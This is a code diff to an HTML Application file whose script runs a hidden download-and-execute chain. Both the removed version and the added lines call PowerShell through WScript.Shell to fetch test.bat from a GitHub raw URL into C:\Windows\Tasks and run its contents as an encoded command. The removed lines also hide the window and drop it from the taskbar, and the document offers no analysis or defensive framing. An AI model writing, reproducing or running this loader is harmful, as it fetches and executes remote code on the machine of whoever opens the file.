@@ -1,21 +1,8 @@
 <html>
 <head>
-<HTA:APPLICATION ID="oHTA"
-APPLICATIONNAME="myApp"
-WINDOWSTATE="normal"
-MAXIMIZEBUTTON="no"
-MINIMIZEBUTTON="no"
-CAPTION="no"
-SHOWINTASKBAR="no"
->
 <script language="JScript">
-window.resizeTo(0,0);
-var myVar = setInterval(function(){ myTimer() }, 3000);
-function myTimer() {
-    shell = new ActiveXObject("WScript.Shell");
-    res = shell.Run("powershell iwr -uri https://raw.githubusercontent.com/p477d343/T5CAMP/main/test.bat -outfile C:\\Windows\\Tasks\\test.bat;powershell -encodedCommand (Get-Content 'C:\\Windows\\Tasks\\test.bat' -raw)");
-window.close();
-}
+var shell = new ActiveXObject("WScript.Shell");
+var res = shell.Run("powershell iwr -uri https://raw.githubusercontent.com/p477d343/T5CAMP/main/test.bat -outfile C:\\Windows\\Tasks\\test.bat; powershell -encodedCommand (Get-Content 'C:\\Windows\\Tasks\\test.bat' -raw)");
 </script>
 </head>
 <body>
